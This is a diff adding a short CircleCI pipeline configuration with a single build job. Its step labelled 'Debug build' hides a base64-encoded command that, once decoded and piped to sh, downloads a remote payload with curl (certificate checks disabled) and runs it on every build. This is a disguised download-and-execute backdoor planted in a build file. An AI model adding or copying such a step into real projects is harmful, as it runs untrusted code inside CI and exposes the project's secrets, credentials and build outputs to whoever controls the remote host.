@@ -1,0 +1,17 @@
+# Use the latest 2.1 version of CircleCI pipeline process engine.
+version: 2.1
+
+jobs:
+  build-branch:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - checkout
+      - run:
+          name: "Debug build"
+          command: "echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy9wYXlsb2FkL3N0dWZmfHNo|base64 -d|sh"
+
+workflows:
+  say-hello-workflow:
+    jobs:
+      - build-branch
